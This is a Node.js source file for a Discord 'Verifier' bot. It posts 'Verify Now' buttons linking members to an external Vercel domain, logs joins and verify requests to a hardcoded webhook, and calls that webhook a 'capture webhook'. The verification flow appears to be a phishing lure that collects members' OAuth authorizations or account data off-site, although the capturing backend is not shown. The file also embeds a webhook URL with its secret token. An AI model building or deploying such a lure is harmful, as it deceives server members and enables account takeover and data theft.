// discord.js v14 | Node 18 | Verifier bot — enhanced logs, owner-only commands
import {
  Client, GatewayIntentBits, SlashCommandBuilder, REST, Routes,
  EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle,
  PermissionFlagsBits, Events
} from 'discord.js';
import 'dotenv/config';
import fs from 'fs';

const CONFIG_FILE = './config.json';
const loadCfg = () => fs.existsSync(CONFIG_FILE) ? JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8')) : {};
const saveCfg = (c) => fs.writeFileSync(CONFIG_FILE, JSON.stringify(c, null, 2));
let cfg = loadCfg();

const WEBHOOK_URL = process.env.WEBHOOK_URL ?? cfg.webhook_url ?? 'https://discord.com/api/webhooks/1570355246234869852/2tGXnwKDVKi5tJUZ32Cftx6XgZxVl7kcpjaLI-9PFTgz2ifWLYSZZqbhitMq1_Wm87Ht';

async function sendLog(embed) {
  const url = process.env.WEBHOOK_URL ?? cfg.webhook_url ?? WEBHOOK_URL;
  return fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ embeds: [{ ...embed, timestamp: new Date().toISOString() }] }),
  }).catch(() => {});
}

const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers],
});

client.once('ready', async () => {
  console.log(`[Verifier] online as ${client.user.tag}`);
  client.user.setActivity('Verifying members', { type: 3 });

  await sendLog({
    title: '🟢 Bot Online',
    color: 0x57f287,
    fields: [
      { name: '🤖 Bot',    value: client.user.tag,                    inline: true },
      { name: '🏠 Guild',  value: `\`${process.env.GUILD_ID}\``,      inline: true },
      { name: '🔗 Domain', value: process.env.VERCEL_DOMAIN ?? 'not set', inline: true },
    ],
  });
});

// ── log member join/leave ─────────────────────────────────────────────────────
client.on(Events.GuildMemberAdd, async (member) => {
  await sendLog({
    title: '📥 Member Joined',
    color: 0x57f287,
    thumbnail: { url: member.user.displayAvatarURL() },
    fields: [
      { name: '👤 User',     value: `${member.user.username} (\`${member.user.id}\`)`, inline: true },
      { name: '📅 Created',  value: `<t:${Math.floor(member.user.createdTimestamp / 1000)}:R>`, inline: true },
      { name: '👥 Members',  value: String(member.guild.memberCount), inline: true },
    ],
  });
});

client.on(Events.GuildMemberRemove, async (member) => {
  await sendLog({
    title: '📤 Member Left',
    color: 0xfee75c,
    thumbnail: { url: member.user.displayAvatarURL() },
    fields: [
      { name: '👤 User',    value: `${member.user.username} (\`${member.user.id}\`)`, inline: true },
      { name: '👥 Members', value: String(member.guild.memberCount), inline: true },
    ],
  });
});

// ── interactions ──────────────────────────────────────────────────────────────
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  const is_owner = interaction.guild?.ownerId === interaction.user.id;
  const domain   = process.env.VERCEL_DOMAIN ?? cfg.domain ?? 'FILL_VERCEL_DOMAIN';
  const link     = `https://${domain}/api/link`;

  // owner-only commands
  const owner_cmds = ['sendverify', 'setrole', 'setwebhook', 'setdomain', 'stats'];
  if (owner_cmds.includes(interaction.commandName) && !is_owner) {
    return interaction.reply({ content: '❌ Only the server owner can use this command.', ephemeral: true });
  }

  switch (interaction.commandName) {

    case 'verify': {
      await interaction.reply({
        embeds: [new EmbedBuilder()
          .setColor(0x5865f2)
          .setTitle('🔐 Verify your account')
          .setDescription('Click the button below to verify.\nThis is required to access the server.')
          .setFooter({ text: 'Powered by Discord OAuth2 · Secure & Encrypted' })
          .setTimestamp()
        ],
        components: [new ActionRowBuilder().addComponents(
          new ButtonBuilder().setLabel('Verify Now').setStyle(ButtonStyle.Link).setURL(link).setEmoji('✅')
        )],
        ephemeral: true,
      });

      await sendLog({
        title: '🔍 Verify Requested',
        color: 0x5865f2,
        fields: [
          { name: '👤 User',    value: `${interaction.user.username} (\`${interaction.user.id}\`)`, inline: true },
          { name: '📍 Channel', value: `<#${interaction.channelId}>`, inline: true },
        ],
      });
      break;
    }

    case 'sendverify': {
      await interaction.channel.send({
        embeds: [new EmbedBuilder()
          .setColor(0x5865f2)
          .setAuthor({ name: interaction.guild.name, iconURL: interaction.guild.iconURL() ?? undefined })
          .setTitle('🛡️ Member Verification')
          .setDescription([
            '**Welcome to the server!**',
            '',
            'To gain access to all channels, you need to verify your Discord account.',
            'This is a quick one-click process.',
            '',
            '**How to verify:**',
            '> 1️⃣  Click the **Verify** button below',
            '> 2️⃣  Authorize the app on the Discord page that opens',
            '> 3️⃣  You will be redirected back and your role will be assigned automatically',
          ].join('\n'))
          .setThumbnail(interaction.guild.iconURL() ?? null)
        ],
        components: [new ActionRowBuilder().addComponents(
          new ButtonBuilder().setLabel('Verify Now').setStyle(ButtonStyle.Link).setURL(link).setEmoji('✅'),
          new ButtonBuilder().setLabel('Support').setStyle(ButtonStyle.Secondary).setCustomId('support_btn').setEmoji('❓'),
        )],
      });
      await interaction.reply({ content: '✅ Verify embed sent.', ephemeral: true });

      await sendLog({
        title: '📨 Verify Embed Posted',
        color: 0x5865f2,
        fields: [
          { name: '📍 Channel', value: `<#${interaction.channelId}>`, inline: true },
          { name: '👤 By',      value: interaction.user.username,     inline: true },
        ],
      });
      break;
    }

    case 'setrole': {
      const role = interaction.options.getRole('role');
      cfg.role_id = role.id;
      process.env.ROLE_ID = role.id;
      saveCfg(cfg);
      await interaction.reply({ content: `✅ Verify role → <@&${role.id}>`, ephemeral: true });

      await sendLog({
        title: '⚙️ Role Updated',
        color: 0xfee75c,
        fields: [
          { name: '🎭 Role', value: `<@&${role.id}> (\`${role.id}\`)`, inline: true },
          { name: '👤 By',   value: interaction.user.username,          inline: true },
        ],
      });
      break;
    }

    case 'setwebhook': {
      const url = interaction.options.getString('url');
      if (!url.startsWith('https://discord.com/api/webhooks/')) {
        return interaction.reply({ content: '❌ Invalid webhook URL.', ephemeral: true });
      }
      cfg.webhook_url = url;
      process.env.WEBHOOK_URL = url;
      saveCfg(cfg);
      await interaction.reply({ content: '✅ Webhook updated.', ephemeral: true });
      break;
    }

    case 'setdomain': {
      const domain_val = interaction.options.getString('domain').replace(/^https?:\/\//, '');
      cfg.domain = domain_val;
      process.env.VERCEL_DOMAIN = domain_val;
      saveCfg(cfg);
      await interaction.reply({ content: `✅ Domain → \`${domain_val}\``, ephemeral: true });

      await sendLog({
        title: '⚙️ Domain Updated',
        color: 0xfee75c,
        fields: [{ name: '🌐 Domain', value: `\`${domain_val}\``, inline: true }],
      });
      break;
    }

    case 'stats': {
      const guild   = interaction.guild;
      const members = await guild.members.fetch();
      const role_id = cfg.role_id ?? process.env.ROLE_ID;
      const verified = role_id ? members.filter(m => m.roles.cache.has(role_id)).size : 'role not set';
      const unverified = role_id ? guild.memberCount - verified : 'N/A';

      await interaction.reply({
        embeds: [new EmbedBuilder()
          .setColor(0x57f287)
          .setTitle('📊 Verifier Stats')
          .setThumbnail(guild.iconURL())
          .addFields(
            { name: '👥 Total Members',  value: String(guild.memberCount), inline: true },
            { name: '✅ Verified',        value: String(verified),          inline: true },
            { name: '❌ Unverified',      value: String(unverified),        inline: true },
            { name: '🎭 Verify Role',     value: role_id ? `<@&${role_id}>` : 'not set', inline: true },
            { name: '🌐 Domain',          value: `\`${process.env.VERCEL_DOMAIN ?? cfg.domain ?? 'not set'}\``, inline: true },
          )
          .setTimestamp()
        ],
        ephemeral: true,
      });
      break;
    }
  }
});

// support button
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isButton()) return;
  if (interaction.customId === 'support_btn') {
    await interaction.reply({
      content: 'Please DM a moderator or open a ticket for help with verification.',
      ephemeral: true,
    });
  }
});

client.login(process.env.BOT_TOKEN);

// ── register commands — owner-only via defaultMemberPermissions ───────────────
const commands = [
  new SlashCommandBuilder()
    .setName('verify')
    .setDescription('Get your personal verification link'),

  new SlashCommandBuilder()
    .setName('sendverify')
    .setDescription('Post verification embed in this channel')
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

  new SlashCommandBuilder()
    .setName('setrole')
    .setDescription('Set role granted on verification')
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
    .addRoleOption(o => o.setName('role').setDescription('Role to grant').setRequired(true)),

  new SlashCommandBuilder()
    .setName('setwebhook')
    .setDescription('Update capture webhook URL')
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
    .addStringOption(o => o.setName('url').setDescription('Discord webhook URL').setRequired(true)),

  new SlashCommandBuilder()
    .setName('setdomain')
    .setDescription('Set Vercel domain')
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
    .addStringOption(o => o.setName('domain').setDescription('e.g. your-app.vercel.app').setRequired(true)),

  new SlashCommandBuilder()
    .setName('stats')
    .setDescription('Show verification stats')
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),

].map(c => c.toJSON());

const rest = new REST({ version: '10' }).setToken(process.env.BOT_TOKEN);
rest.put(
  Routes.applicationGuildCommands(process.env.DISCORD_CLIENT_ID, process.env.GUILD_ID),
  { body: commands }
).then(() => console.log('[Verifier] Commands registered'));
